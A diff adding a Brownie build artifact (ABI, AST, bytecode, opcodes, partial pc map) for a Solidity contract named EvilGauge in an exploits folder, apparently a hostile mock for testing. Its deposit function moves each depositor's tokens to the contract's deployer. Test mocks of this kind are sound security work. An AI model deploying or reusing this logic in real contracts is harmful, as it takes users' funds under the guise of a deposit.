@@ -1,0 +1,1759 @@
+{
+  "abi": [
+    {
+      "inputs": [
+        {
+          "internalType": "address",
+          "name": "_token",
+          "type": "address"
+        }
+      ],
+      "payable": false,
+      "stateMutability": "nonpayable",
+      "type": "constructor"
+    },
+    {
+      "constant": false,
+      "inputs": [
+        {
+          "internalType": "uint256",
+          "name": "amount",
+          "type": "uint256"
+        }
+      ],
+      "name": "deposit",
+      "outputs": [],
+      "payable": false,
+      "stateMutability": "nonpayable",
+      "type": "function"
+    }
+  ],
+  "allSourcePaths": {
+    "11": "contracts/exploits/EvilGauge.sol",
+    "5": "/Users/sbacha/.brownie/packages/OpenZeppelin/openzeppelin-contracts@2.5.1/contracts/token/ERC20/IERC20.sol"
+  },
+  "ast": {
+    "absolutePath": "contracts/exploits/EvilGauge.sol",
+    "exportedSymbols": {
+      "EvilGauge": [
+        1617
+      ]
+    },
+    "id": 1618,
+    "nodeType": "SourceUnit",
+    "nodes": [
+      {
+        "id": 1579,
+        "literals": [
+          "solidity",
+          "=",
+          "0.5",
+          ".17"
+        ],
+        "nodeType": "PragmaDirective",
+        "src": "0:24:11"
+      },
+      {
+        "absolutePath": "/Users/sbacha/.brownie/packages/OpenZeppelin/openzeppelin-contracts@2.5.1/contracts/token/ERC20/IERC20.sol",
+        "file": "@openzeppelinV2/contracts/token/ERC20/IERC20.sol",
+        "id": 1580,
+        "nodeType": "ImportDirective",
+        "scope": 1618,
+        "sourceUnit": 35493,
+        "src": "26:58:11",
+        "symbolAliases": [],
+        "unitAlias": ""
+      },
+      {
+        "baseContracts": [],
+        "contractDependencies": [],
+        "contractKind": "contract",
+        "documentation": null,
+        "fullyImplemented": true,
+        "id": 1617,
+        "linearizedBaseContracts": [
+          1617
+        ],
+        "name": "EvilGauge",
+        "nodeType": "ContractDefinition",
+        "nodes": [
+          {
+            "constant": false,
+            "id": 1582,
+            "name": "token",
+            "nodeType": "VariableDeclaration",
+            "scope": 1617,
+            "src": "111:12:11",
+            "stateVariable": true,
+            "storageLocation": "default",
+            "typeDescriptions": {
+              "typeIdentifier": "t_contract$_IERC20_$35492",
+              "typeString": "contract IERC20"
+            },
+            "typeName": {
+              "contractScope": null,
+              "id": 1581,
+              "name": "IERC20",
+              "nodeType": "UserDefinedTypeName",
+              "referencedDeclaration": 35492,
+              "src": "111:6:11",
+              "typeDescriptions": {
+                "typeIdentifier": "t_contract$_IERC20_$35492",
+                "typeString": "contract IERC20"
+              }
+            },
+            "value": null,
+            "visibility": "internal"
+          },
+          {
+            "constant": false,
+            "id": 1584,
+            "name": "owner",
+            "nodeType": "VariableDeclaration",
+            "scope": 1617,
+            "src": "129:13:11",
+            "stateVariable": true,
+            "storageLocation": "default",
+            "typeDescriptions": {
+              "typeIdentifier": "t_address",
+              "typeString": "address"
+            },
+            "typeName": {
+              "id": 1583,
+              "name": "address",
+              "nodeType": "ElementaryTypeName",
+              "src": "129:7:11",
+              "stateMutability": "nonpayable",
+              "typeDescriptions": {
+                "typeIdentifier": "t_address",
+                "typeString": "address"
+              }
+            },
+            "value": null,
+            "visibility": "internal"
+          },
+          {
+            "body": {
+              "id": 1600,
+              "nodeType": "Block",
+              "src": "184:67:11",
+              "statements": [
+                {
+                  "expression": {
+                    "argumentTypes": null,
+                    "id": 1592,
+                    "isConstant": false,
+                    "isLValue": false,
+                    "isPure": false,
+                    "lValueRequested": false,
+                    "leftHandSide": {
+                      "argumentTypes": null,
+                      "id": 1589,
+                      "name": "owner",
+                      "nodeType": "Identifier",
+                      "overloadedDeclarations": [],
+                      "referencedDeclaration": 1584,
+                      "src": "194:5:11",
+                      "typeDescriptions": {
+                        "typeIdentifier": "t_address",
+                        "typeString": "address"
+                      }
+                    },
+                    "nodeType": "Assignment",
+                    "operator": "=",
+                    "rightHandSide": {
+                      "argumentTypes": null,
+                      "expression": {
+                        "argumentTypes": null,
+                        "id": 1590,
+                        "name": "msg",
+                        "nodeType": "Identifier",
+                        "overloadedDeclarations": [],
+                        "referencedDeclaration": 37932,
+                        "src": "202:3:11",
+                        "typeDescriptions": {
+                          "typeIdentifier": "t_magic_message",
+                          "typeString": "msg"
+                        }
+                      },
+                      "id": 1591,
+                      "isConstant": false,
+                      "isLValue": false,
+                      "isPure": false,
+                      "lValueRequested": false,
+                      "memberName": "sender",
+                      "nodeType": "MemberAccess",
+                      "referencedDeclaration": null,
+                      "src": "202:10:11",
+                      "typeDescriptions": {
+                        "typeIdentifier": "t_address_payable",
+                        "typeString": "address payable"
+                      }
+                    },
+                    "src": "194:18:11",
+                    "typeDescriptions": {
+                      "typeIdentifier": "t_address",
+                      "typeString": "address"
+                    }
+                  },
+                  "id": 1593,
+                  "nodeType": "ExpressionStatement",
+                  "src": "194:18:11"
+                },
+                {
+                  "expression": {
+                    "argumentTypes": null,
+                    "id": 1598,
+                    "isConstant": false,
+                    "isLValue": false,
+                    "isPure": false,
+                    "lValueRequested": false,
+                    "leftHandSide": {
+                      "argumentTypes": null,
+                      "id": 1594,
+                      "name": "token",
+                      "nodeType": "Identifier",
+                      "overloadedDeclarations": [],
+                      "referencedDeclaration": 1582,
+                      "src": "222:5:11",
+                      "typeDescriptions": {
+                        "typeIdentifier": "t_contract$_IERC20_$35492",
+                        "typeString": "contract IERC20"
+                      }
+                    },
+                    "nodeType": "Assignment",
+                    "operator": "=",
+                    "rightHandSide": {
+                      "argumentTypes": null,
+                      "arguments": [
+                        {
+                          "argumentTypes": null,
+                          "id": 1596,
+                          "name": "_token",
+                          "nodeType": "Identifier",
+                          "overloadedDeclarations": [],
+                          "referencedDeclaration": 1586,
+                          "src": "237:6:11",
+                          "typeDescriptions": {
+                            "typeIdentifier": "t_address",
+                            "typeString": "address"
+                          }
+                        }
+                      ],
+                      "expression": {
+                        "argumentTypes": [
+                          {
+                            "typeIdentifier": "t_address",
+                            "typeString": "address"
+                          }
+                        ],
+                        "id": 1595,
+                        "name": "IERC20",
+                        "nodeType": "Identifier",
+                        "overloadedDeclarations": [],
+                        "referencedDeclaration": 35492,
+                        "src": "230:6:11",
+                        "typeDescriptions": {
+                          "typeIdentifier": "t_type$_t_contract$_IERC20_$35492_$",
+                          "typeString": "type(contract IERC20)"
+                        }
+                      },
+                      "id": 1597,
+                      "isConstant": false,
+                      "isLValue": false,
+                      "isPure": false,
+                      "kind": "typeConversion",
+                      "lValueRequested": false,
+                      "names": [],
+                      "nodeType": "FunctionCall",
+                      "src": "230:14:11",
+                      "typeDescriptions": {
+                        "typeIdentifier": "t_contract$_IERC20_$35492",
+                        "typeString": "contract IERC20"
+                      }
+                    },
+                    "src": "222:22:11",
+                    "typeDescriptions": {
+                      "typeIdentifier": "t_contract$_IERC20_$35492",
+                      "typeString": "contract IERC20"
+                    }
+                  },
+                  "id": 1599,
+                  "nodeType": "ExpressionStatement",
+                  "src": "222:22:11"
+                }
+              ]
+            },
+            "documentation": null,
+            "id": 1601,
+            "implemented": true,
+            "kind": "constructor",
+            "modifiers": [],
+            "name": "",
+            "nodeType": "FunctionDefinition",
+            "parameters": {
+              "id": 1587,
+              "nodeType": "ParameterList",
+              "parameters": [
+                {
+                  "constant": false,
+                  "id": 1586,
+                  "name": "_token",
+                  "nodeType": "VariableDeclaration",
+                  "scope": 1601,
+                  "src": "161:14:11",
+                  "stateVariable": false,
+                  "storageLocation": "default",
+                  "typeDescriptions": {
+                    "typeIdentifier": "t_address",
+                    "typeString": "address"
+                  },
+                  "typeName": {
+                    "id": 1585,
+                    "name": "address",
+                    "nodeType": "ElementaryTypeName",
+                    "src": "161:7:11",
+                    "stateMutability": "nonpayable",
+                    "typeDescriptions": {
+                      "typeIdentifier": "t_address",
+                      "typeString": "address"
+                    }
+                  },
+                  "value": null,
+                  "visibility": "internal"
+                }
+              ],
+              "src": "160:16:11"
+            },
+            "returnParameters": {
+              "id": 1588,
+              "nodeType": "ParameterList",
+              "parameters": [],
+              "src": "184:0:11"
+            },
+            "scope": 1617,
+            "src": "149:102:11",
+            "stateMutability": "nonpayable",
+            "superFunction": null,
+            "visibility": "public"
+          },
+          {
+            "body": {
+              "id": 1615,
+              "nodeType": "Block",
+              "src": "297:62:11",
+              "statements": [
+                {
+                  "expression": {
+                    "argumentTypes": null,
+                    "arguments": [
+                      {
+                        "argumentTypes": null,
+                        "expression": {
+                          "argumentTypes": null,
+                          "id": 1609,
+                          "name": "msg",
+                          "nodeType": "Identifier",
+                          "overloadedDeclarations": [],
+                          "referencedDeclaration": 37932,
+                          "src": "326:3:11",
+                          "typeDescriptions": {
+                            "typeIdentifier": "t_magic_message",
+                            "typeString": "msg"
+                          }
+                        },
+                        "id": 1610,
+                        "isConstant": false,
+                        "isLValue": false,
+                        "isPure": false,
+                        "lValueRequested": false,
+                        "memberName": "sender",
+                        "nodeType": "MemberAccess",
+                        "referencedDeclaration": null,
+                        "src": "326:10:11",
+                        "typeDescriptions": {
+                          "typeIdentifier": "t_address_payable",
+                          "typeString": "address payable"
+                        }
+                      },
+                      {
+                        "argumentTypes": null,
+                        "id": 1611,
+                        "name": "owner",
+                        "nodeType": "Identifier",
+                        "overloadedDeclarations": [],
+                        "referencedDeclaration": 1584,
+                        "src": "338:5:11",
+                        "typeDescriptions": {
+                          "typeIdentifier": "t_address",
+                          "typeString": "address"
+                        }
+                      },
+                      {
+                        "argumentTypes": null,
+                        "id": 1612,
+                        "name": "amount",
+                        "nodeType": "Identifier",
+                        "overloadedDeclarations": [],
+                        "referencedDeclaration": 1603,
+                        "src": "345:6:11",
+                        "typeDescriptions": {
+                          "typeIdentifier": "t_uint256",
+                          "typeString": "uint256"
+                        }
+                      }
+                    ],
+                    "expression": {
+                      "argumentTypes": [
+                        {
+                          "typeIdentifier": "t_address_payable",
+                          "typeString": "address payable"
+                        },
+                        {
+                          "typeIdentifier": "t_address",
+                          "typeString": "address"
+                        },
+                        {
+                          "typeIdentifier": "t_uint256",
+                          "typeString": "uint256"
+                        }
+                      ],
+                      "expression": {
+                        "argumentTypes": null,
+                        "id": 1606,
+                        "name": "token",
+                        "nodeType": "Identifier",
+                        "overloadedDeclarations": [],
+                        "referencedDeclaration": 1582,
+                        "src": "307:5:11",
+                        "typeDescriptions": {
+                          "typeIdentifier": "t_contract$_IERC20_$35492",
+                          "typeString": "contract IERC20"
+                        }
+                      },
+                      "id": 1608,
+                      "isConstant": false,
+                      "isLValue": false,
+                      "isPure": false,
+                      "lValueRequested": false,
+                      "memberName": "transferFrom",
+                      "nodeType": "MemberAccess",
+                      "referencedDeclaration": 35475,
+                      "src": "307:18:11",
+                      "typeDescriptions": {
+                        "typeIdentifier": "t_function_external_nonpayable$_t_address_$_t_address_$_t_uint256_$returns$_t_bool_$",
+                        "typeString": "function (address,address,uint256) external returns (bool)"
+                      }
+                    },
+                    "id": 1613,
+                    "isConstant": false,
+                    "isLValue": false,
+                    "isPure": false,
+                    "kind": "functionCall",
+                    "lValueRequested": false,
+                    "names": [],
+                    "nodeType": "FunctionCall",
+                    "src": "307:45:11",
+                    "typeDescriptions": {
+                      "typeIdentifier": "t_bool",
+                      "typeString": "bool"
+                    }
+                  },
+                  "id": 1614,
+                  "nodeType": "ExpressionStatement",
+                  "src": "307:45:11"
+                }
+              ]
+            },
+            "documentation": null,
+            "id": 1616,
+            "implemented": true,
+            "kind": "function",
+            "modifiers": [],
+            "name": "deposit",
+            "nodeType": "FunctionDefinition",
+            "parameters": {
+              "id": 1604,
+              "nodeType": "ParameterList",
+              "parameters": [
+                {
+                  "constant": false,
+                  "id": 1603,
+                  "name": "amount",
+                  "nodeType": "VariableDeclaration",
+                  "scope": 1616,
+                  "src": "274:14:11",
+                  "stateVariable": false,
+                  "storageLocation": "default",
+                  "typeDescriptions": {
+                    "typeIdentifier": "t_uint256",
+                    "typeString": "uint256"
+                  },
+                  "typeName": {
+                    "id": 1602,
+                    "name": "uint256",
+                    "nodeType": "ElementaryTypeName",
+                    "src": "274:7:11",
+                    "typeDescriptions": {
+                      "typeIdentifier": "t_uint256",
+                      "typeString": "uint256"
+                    }
+                  },
+                  "value": null,
+                  "visibility": "internal"
+                }
+              ],
+              "src": "273:16:11"
+            },
+            "returnParameters": {
+              "id": 1605,
+              "nodeType": "ParameterList",
+              "parameters": [],
+              "src": "297:0:11"
+            },
+            "scope": 1617,
+            "src": "257:102:11",
+            "stateMutability": "nonpayable",
+            "superFunction": null,
+            "visibility": "public"
+          }
+        ],
+        "scope": 1618,
+        "src": "86:275:11"
+      }
+    ],
+    "src": "0:362:11"
+  },
+  "bytecode": "608060405234801561001057600080fd5b5060405161017e38038061017e8339818101604052602081101561003357600080fd5b5051600180546001600160a01b03199081163317909155600080546001600160a01b039093169290911691909117905561010c806100726000396000f3fe6080604052348015600f57600080fd5b506004361060285760003560e01c8063b6b55f2514602d575b600080fd5b604760048036036020811015604157600080fd5b50356049565b005b60008054600154604080516323b872dd60e01b81523360048201526001600160a01b03928316602482015260448101869052905191909216926323b872dd92606480820193602093909283900390910190829087803b15801560aa57600080fd5b505af115801560bd573d6000803e3d6000fd5b505050506040513d602081101560d257600080fd5b50505056fea265627a7a723158204da14457fb06ff92897817d15ce845e57f75f663a656dbf42e3b5f7d3761975764736f6c63430005110032",
+  "bytecodeSha1": "901f2dff8f571c4188ae8c8eaeda1aaa47b1cc40",
+  "compiler": {
+    "evm_version": "istanbul",
+    "optimizer": {
+      "enabled": true,
+      "runs": 200
+    },
+    "version": "0.5.17+commit.d19bba13"
+  },
+  "contractName": "EvilGauge",
+  "coverageMap": {
+    "branches": {
+      "11": {},
+      "5": {}
+    },
+    "statements": {
+      "11": {
+        "EvilGauge.deposit": {
+          "0": [
+            307,
+            352
+          ]
+        }
+      },
+      "5": {}
+    }
+  },
+  "dependencies": [
+    "OpenZeppelin/openzeppelin-contracts@2.5.1/IERC20"
+  ],
+  "deployedBytecode": "6080604052348015600f57600080fd5b506004361060285760003560e01c8063b6b55f2514602d575b600080fd5b604760048036036020811015604157600080fd5b50356049565b005b60008054600154604080516323b872dd60e01b81523360048201526001600160a01b03928316602482015260448101869052905191909216926323b872dd92606480820193602093909283900390910190829087803b15801560aa57600080fd5b505af115801560bd573d6000803e3d6000fd5b505050506040513d602081101560d257600080fd5b50505056fea265627a7a723158204da14457fb06ff92897817d15ce845e57f75f663a656dbf42e3b5f7d3761975764736f6c63430005110032",
+  "deployedSourceMap": "86:275:11:-;;;;8:9:-1;5:2;;;30:1;27;20:12;5:2;86:275:11;;;;;;;;;;;;;;;;;;;257:102;;;;;;13:2:-1;8:3;5:11;2:2;;;29:1;26;19:12;2:2;-1:-1;257:102:11;;:::i;:::-;;;307:5;;;;338;307:45;;;-1:-1:-1;;;307:45:11;;326:10;307:45;;;;-1:-1:-1;;;;;338:5:11;;;307:45;;;;;;;;;;;;:5;;;;;:18;;:45;;;;;;;;;;;;;;;;;;:5;:45;;;5:2:-1;;;;30:1;27;20:12;5:2;307:45:11;;;;8:9:-1;5:2;;;45:16;42:1;39;24:38;77:16;74:1;67:27;5:2;307:45:11;;;;;;;13:2:-1;8:3;5:11;2:2;;;29:1;26;19:12;2:2;-1:-1;;;257:102:11:o",
+  "language": "Solidity",
+  "natspec": {
+    "methods": {}
+  },
+  "offset": [
+    86,
+    361
+  ],
+  "opcodes": "PUSH1 0x80 PUSH1 0x40 MSTORE CALLVALUE DUP1 ISZERO PUSH1 0xF JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x4 CALLDATASIZE LT PUSH1 0x28 JUMPI PUSH1 0x0 CALLDATALOAD PUSH1 0xE0 SHR DUP1 PUSH4 0xB6B55F25 EQ PUSH1 0x2D JUMPI JUMPDEST PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH1 0x47 PUSH1 0x4 DUP1 CALLDATASIZE SUB PUSH1 0x20 DUP2 LT ISZERO PUSH1 0x41 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP CALLDATALOAD PUSH1 0x49 JUMP JUMPDEST STOP JUMPDEST PUSH1 0x0 DUP1 SLOAD PUSH1 0x1 SLOAD PUSH1 0x40 DUP1 MLOAD PUSH4 0x23B872DD PUSH1 0xE0 SHL DUP2 MSTORE CALLER PUSH1 0x4 DUP3 ADD MSTORE PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB SWAP3 DUP4 AND PUSH1 0x24 DUP3 ADD MSTORE PUSH1 0x44 DUP2 ADD DUP7 SWAP1 MSTORE SWAP1 MLOAD SWAP2 SWAP1 SWAP3 AND SWAP3 PUSH4 0x23B872DD SWAP3 PUSH1 0x64 DUP1 DUP3 ADD SWAP4 PUSH1 0x20 SWAP4 SWAP1 SWAP3 DUP4 SWAP1 SUB SWAP1 SWAP2 ADD SWAP1 DUP3 SWAP1 DUP8 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH1 0xAA JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP GAS CALL ISZERO DUP1 ISZERO PUSH1 0xBD JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP PUSH1 0x40 MLOAD RETURNDATASIZE PUSH1 0x20 DUP2 LT ISZERO PUSH1 0xD2 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP POP POP JUMP INVALID LOG2 PUSH6 0x627A7A723158 KECCAK256 0x4D LOG1 DIFFICULTY JUMPI 0xFB MOD SELFDESTRUCT SWAP3 DUP10 PUSH25 0x17D15CE845E57F75F663A656DBF42E3B5F7D3761975764736F PUSH13 0x63430005110032000000000000 ",
+  "pcMap": {
+    "0": {
+      "offset": [
+        86,
+        361
+      ],
+      "op": "PUSH1",
+      "path": "11",
+      "value": "0x80"
+    },
+    "2": {
+      "fn": null,
+      "offset": [
+        86,
+        361
+      ],
+      "op": "PUSH1",
+      "path": "11",
+      "value": "0x40"
+    },
+    "4": {
+      "fn": null,
+      "offset": [
+        86,
+        361
+      ],
+      "op": "MSTORE",
+      "path": "11"
+    },
+    "5": {
+      "fn": null,
+      "offset": [
+        86,
+        361
+      ],
+      "op": "CALLVALUE",
+      "path": "11"
+    },
+    "6": {
+      "op": "DUP1"
+    },
+    "7": {
+      "op": "ISZERO"
+    },
+    "8": {
+      "op": "PUSH1",
+      "value": "0xF"
+    },
+    "10": {
+      "op": "JUMPI"
+    },
+    "11": {
+      "op": "PUSH1",
+      "value": "0x0"
+    },
+    "13": {
+      "op": "DUP1"
+    },
+    "14": {
+      "dev": "Cannot send ether to nonpayable function",
+      "fn": null,
+      "offset": [
+        86,
+        361
+      ],
+      "op": "REVERT",
+      "path": "11"
+    },
+    "15": {
+      "op": "JUMPDEST"
+    },
+    "16": {
+      "offset": [
+        86,
+        361
+      ],
+      "op": "POP",
+      "path": "11"
+    },
+    "17": {
+      "fn": null,
+      "offset": [
+        86,
+        361
+      ],
+      "op": "PUSH1",
+      "path": "11",
+      "value": "0x4"
+    },
+    "19": {
+      "fn": null,
+      "offset": [
+        86,
+        361
+      ],
+      "op": "CALLDATASIZE",
+      "path": "11"
+    },
+    "20": {
+      "fn": null,
+      "offset": [
+        86,
+        361
+      ],
+      "op": "LT",
+      "path": "11"
+    },
+    "21": {
+      "fn": null,
+      "offset": [
+        86,
+        361
+      ],
+      "op": "PUSH1",
+      "path": "11",
+      "value": "0x28"
+    },
+    "23": {
+      "fn": null,
+      "offset": [
+        86,
+        361
+      ],
+      "op": "JUMPI",
+      "path": "11"
+    },
+    "24": {
+      "fn": null,
+      "offset": [
+        86,
+        361
+      ],
+      "op": "PUSH1",
+      "path": "11",
+      "value": "0x0"
+    },
+    "26": {
+      "fn": null,
+      "offset": [
+        86,
+        361
+      ],
+      "op": "CALLDATALOAD",
+      "path": "11"
+    },
+    "27": {
+      "fn": null,
+      "offset": [
+        86,
+        361
+      ],
+      "op": "PUSH1",
+      "path": "11",
+      "value": "0xE0"
+    },
+    "29": {
+      "fn": null,
+      "offset": [
+        86,
+        361
+      ],
+      "op": "SHR",
+      "path": "11"
+    },
+    "30": {
+      "fn": null,
+      "offset": [
+        86,
+        361
+      ],
+      "op": "DUP1",
+      "path": "11"
+    },
+    "31": {
+      "fn": null,
+      "offset": [
+        86,
+        361
+      ],
+      "op": "PUSH4",
+      "path": "11",
+      "value": "0xB6B55F25"
+    },
+    "36": {
+      "fn": null,
+      "offset": [
+        86,
+        361
+      ],
+      "op": "EQ",
+      "path": "11"
+    },
+    "37": {
+      "fn": null,
+      "offset": [
+        86,
+        361
+      ],
+      "op": "PUSH1",
+      "path": "11",
+      "value": "0x2D"
+    },
+    "39": {
+      "fn": null,
+      "offset": [
+        86,
+        361
+      ],
+      "op": "JUMPI",
+      "path": "11"
+    },
+    "40": {
+      "fn": null,
+      "offset": [
+        86,
+        361
+      ],
+      "op": "JUMPDEST",
+      "path": "11"
+    },
+    "41": {
+      "fn": null,
+      "offset": [
+        86,
+        361
+      ],
+      "op": "PUSH1",
+      "path": "11",
+      "value": "0x0"
+    },
+    "43": {
+      "fn": null,
+      "offset": [
+        86,
+        361
+      ],
+      "op": "DUP1",
+      "path": "11"
+    },
+    "44": {
+      "first_revert": true,
+      "fn": null,
+      "offset": [
+        86,
+        361
+      ],
+      "op": "REVERT",
+      "path": "11"
+    },
+    "45": {
+      "fn": "EvilGauge.deposit",
+      "offset": [
+        257,
+        359
+      ],
+      "op": "JUMPDEST",
+      "path": "11"
+    },
+    "46": {
+      "fn": "EvilGauge.deposit",
+      "offset": [
+        257,
+        359
+      ],
+      "op": "PUSH1",
+      "path": "11",
+      "value": "0x47"
+    },
+    "48": {
+      "fn": "EvilGauge.deposit",
+      "offset": [
+        257,
+        359
+      ],
+      "op": "PUSH1",
+      "path": "11",
+      "value": "0x4"
+    },
+    "50": {
+      "fn": "EvilGauge.deposit",
+      "offset": [
+        257,
+        359
+      ],
+      "op": "DUP1",
+      "path": "11"
+    },
+    "51": {
+      "fn": "EvilGauge.deposit",
+      "offset": [
+        257,
+        359
+      ],
+      "op": "CALLDATASIZE",
+      "path": "11"
+    },
+    "52": {
+      "fn": "EvilGauge.deposit",
+      "offset": [
+        257,
+        359
+      ],
+      "op": "SUB",
+      "path": "11"
+    },
+    "53": {
+      "op": "PUSH1",
+      "value": "0x20"
+    },
+    "55": {
+      "op": "DUP2"
+    },
+    "56": {
+      "op": "LT"
+    },
+    "57": {
+      "op": "ISZERO"
+    },
+    "58": {
+      "op": "PUSH1",
+      "value": "0x41"
+    },
+    "60": {
+      "op": "JUMPI"
+    },
+    "61": {
+      "op": "PUSH1",
+      "value": "0x0"
+    },
+    "63": {
+      "op": "DUP1"
+    },
+    "64": {
+      "op": "REVERT"
+    },
+    "65": {
+      "op": "JUMPDEST"
+    },
+    "66": {
+      "op": "POP"
+    },
+    "67": {
+      "fn": "EvilGauge.deposit",
+      "offset": [
+        257,
+        359
+      ],
+      "op": "CALLDATALOAD",
+      "path": "11"
+    },
+    "68": {
+      "fn": "EvilGauge.deposit",
+      "offset": [
+        257,
+        359
+      ],
+      "op": "PUSH1",
+      "path": "11",
+      "value": "0x49"
+    },
+    "70": {
+      "fn": "EvilGauge.deposit",
+      "jump": "i",
+      "offset": [
+        257,
+        359
+      ],
+      "op": "JUMP",
+      "path": "11"
+    },
+    "71": {
+      "fn": "EvilGauge.deposit",
+      "offset": [
+        257,
+        359
+      ],
+      "op": "JUMPDEST",
+      "path": "11"
+    },
+    "72": {
+      "fn": "EvilGauge.deposit",
+      "offset": [
+        257,
+        359
+      ],
+      "op": "STOP",
+      "path": "11"
+    },
+    "73": {
+      "fn": "EvilGauge.deposit",
+      "offset": [
+        257,
+        359
+      ],
+      "op": "JUMPDEST",
+      "path": "11"
+    },
+    "74": {
+      "fn": "EvilGauge.deposit",
+      "offset": [
+        307,
+        312
+      ],
+      "op": "PUSH1",
+      "path": "11",
+      "statement": 0,
+      "value": "0x0"
+    },
+    "76": {
+      "fn": "EvilGauge.deposit",
+      "offset": [
+        307,
+        312
+      ],
+      "op": "DUP1",
+      "path": "11"
+    },
+    "77": {
+      "fn": "EvilGauge.deposit",
+      "offset": [
+        307,
+        312
+      ],
+      "op": "SLOAD",
+      "path": "11"
+    },
+    "78": {
+      "fn": "EvilGauge.deposit",
+      "offset": [
+        307,
+        312
+      ],
+      "op": "PUSH1",
+      "path": "11",
+      "value": "0x1"
+    },
+    "80": {
+      "fn": "EvilGauge.deposit",
+      "offset": [
+        338,
+        343
+      ],
+      "op": "SLOAD",
+      "path": "11"
+    },
+    "81": {
+      "fn": "EvilGauge.deposit",
+      "offset": [
+        307,
+        352
+      ],
+      "op": "PUSH1",
+      "path": "11",
+      "value": "0x40"
+    },
+    "83": {
+      "fn": "EvilGauge.deposit",
+      "offset": [
+        307,
+        352
+      ],
+      "op": "DUP1",
+      "path": "11"
+    },
+    "84": {
+      "fn": "EvilGauge.deposit",
+      "offset": [
+        307,
+        352
+      ],
+      "op": "MLOAD",
+      "path": "11"
+    },
+    "85": {
+      "op": "PUSH4",
+      "value": "0x23B872DD"
+    },
+    "90": {
+      "op": "PUSH1",
+      "value": "0xE0"
+    },
+    "92": {
+      "op": "SHL"
+    },
+    "93": {
+      "fn": "EvilGauge.deposit",
+      "offset": [
+        307,
+        352
+      ],
+      "op": "DUP2",
+      "path": "11"
+    },
+    "94": {
+      "fn": "EvilGauge.deposit",
+      "offset": [
+        307,
+        352
+      ],
+      "op": "MSTORE",
+      "path": "11"
+    },
+    "95": {
+      "fn": "EvilGauge.deposit",
+      "offset": [
+        326,
+        336
+      ],
+      "op": "CALLER",
+      "path": "11"
+    },
+    "96": {
+      "fn": "EvilGauge.deposit",
+      "offset": [
+        307,
+        352
+      ],
+      "op": "PUSH1",
+      "path": "11",
+      "value": "0x4"
+    },
+    "98": {
+      "fn": "EvilGauge.deposit",
+      "offset": [
+        307,
+        352
+      ],
+      "op": "DUP3",
+      "path": "11"
+    },
+    "99": {
+      "fn": "EvilGauge.deposit",
+      "offset": [
+        307,
+        352
+      ],
+      "op": "ADD",
+      "path": "11"
+    },
+    "100": {
+      "fn": "EvilGauge.deposit",
+      "offset": [
+        307,
+        352
+      ],
+      "op": "MSTORE",
+      "path": "11"
+    },
+    "101": {
+      "op": "PUSH1",
+      "value": "0x1"
+    },
+    "103": {
+      "op": "PUSH1",
+      "value": "0x1"
+    },
+    "105": {
+      "op": "PUSH1",
+      "value": "0xA0"
+    },
+    "107": {
+      "op": "SHL"
+    },
+    "108": {
+      "op": "SUB"
+    },
+    "109": {
+      "fn": "EvilGauge.deposit",
+      "offset": [
+        338,
+        343
+      ],
+      "op": "SWAP3",
+      "path": "11"
+    },
+    "110": {
+      "fn": "EvilGauge.deposit",
+      "offset": [
+        338,
+        343
+      ],
+      "op": "DUP4",
+      "path": "11"
+    },
+    "111": {
+      "fn": "EvilGauge.deposit",
+      "offset": [
+        338,
+        343
+      ],
+      "op": "AND",
+      "path": "11"
+    },
+    "112": {
+      "fn": "EvilGauge.deposit",
+      "offset": [
+        307,
+        352
+      ],
+      "op": "PUSH1",
+      "path": "11",
+      "value": "0x24"
+    },
+    "114": {
+      "fn": "EvilGauge.deposit",
+      "offset": [
+        307,
+        352
+      ],
+      "op": "DUP3",
+      "path": "11"
+    },
+    "115": {
+      "fn": "EvilGauge.deposit",
+      "offset": [
+        307,
+        352
+      ],
+      "op": "ADD",
+      "path": "11"
+    },
+    "116": {
+      "fn": "EvilGauge.deposit",
+      "offset": [
+        307,
+        352
+      ],
+      "op": "MSTORE",
+      "path": "11"
+    },
+    "117": {
+      "fn": "EvilGauge.deposit",
+      "offset": [
+        307,
+        352
+      ],
+      "op": "PUSH1",
+      "path": "11",
+      "value": "0x44"
+    },
+    "119": {
+      "fn": "EvilGauge.deposit",
+      "offset": [
+        307,
+        352
+      ],
+      "op": "DUP2",
+      "path": "11"
+    },
+    "120": {
+      "fn": "EvilGauge.deposit",
+      "offset": [
+        307,
+        352
+      ],
+      "op": "ADD",
+      "path": "11"
+    },
+    "121": {
+      "fn": "EvilGauge.deposit",
+      "offset": [
+        307,
+        352
+      ],
+      "op": "DUP7",
+      "path": "11"
+    },
+    "122": {
+      "fn": "EvilGauge.deposit",
+      "offset": [
+        307,
+        352
+      ],
+      "op": "SWAP1",
+      "path": "11"
+    },
+    "123": {
+      "fn": "EvilGauge.deposit",
+      "offset": [
+        307,
+        352
+      ],
+      "op": "MSTORE",
+      "path": "11"
+    },
+    "124": {
+      "fn": "EvilGauge.deposit",
+      "offset": [
+        307,
+        352
+      ],
+      "op": "SWAP1",
+      "path": "11"
+    },
+    "125": {
+      "fn": "EvilGauge.deposit",
+      "offset": [
+        307,
+        352
+      ],
+      "op": "MLOAD",
+      "path": "11"
+    },
+    "126": {
+      "fn": "EvilGauge.deposit",
+      "offset": [
+        307,
+        312
+      ],
+      "op": "SWAP2",
+      "path": "11"
+    },
+    "127": {
+      "fn": "EvilGauge.deposit",
+      "offset": [
+        307,
+        312
+      ],
+      "op": "SWAP1",
+      "path": "11"
+    },
+    "128": {
+      "fn": "EvilGauge.deposit",
+      "offset": [
+        307,
+        312
+      ],
+      "op": "SWAP3",
+      "path": "11"
+    },
+    "129": {
+      "fn": "EvilGauge.deposit",
+      "offset": [
+        307,
+        312
+      ],
+      "op": "AND",
+      "path": "11"
+    },
+    "130": {
+      "fn": "EvilGauge.deposit",
+      "offset": [
+        307,
+        312
+      ],
+      "op": "SWAP3",
+      "path": "11"
+    },
+    "131": {
+      "fn": "EvilGauge.deposit",
+      "offset": [
+        307,
+        325
+      ],
+      "op": "PUSH4",
+      "path": "11",
+      "value": "0x23B872DD"
+    },
+    "136": {
+      "fn": "EvilGauge.deposit",
+      "offset": [
+        307,
+        325
+      ],
+      "op": "SWAP3",
+      "path": "11"
+    },
